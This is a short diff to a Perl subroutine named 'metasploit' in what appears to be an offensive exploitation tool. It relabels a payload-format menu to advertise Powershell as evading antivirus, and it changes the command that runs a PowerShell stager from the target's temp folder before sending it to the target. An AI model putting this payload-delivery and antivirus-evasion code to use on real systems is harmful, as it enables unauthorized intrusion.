@@ -104,7 +104,7 @@ sub metasploit
 	}
 	my $fileformat = "";
 	print "[+] Which file format you want to use?\n";
-	print "    1: Powershell\n     2: PE executable\n";
+	print "    1: Powershell (helps evading AV)\n     2: PE executable (works on older servers)\n";
 	while (($fileformat !=1) and ($fileformat != 2)) {
 		print "> ";
 		$fileformat = <STDIN>;
@@ -244,7 +244,7 @@ sub metasploit
 				  $cmd = usechurrasco($cmd);
 			}
 		} else {
-			$cmd = "powershell.exe -noexit -file %TEMP%\\".$exe.".ps1";
+			$cmd = "powershell.exe -noexit -file %TEMP%\\".$stager;
 		}
 		$command = createcommand($cmd);
 		sendrequest($command);
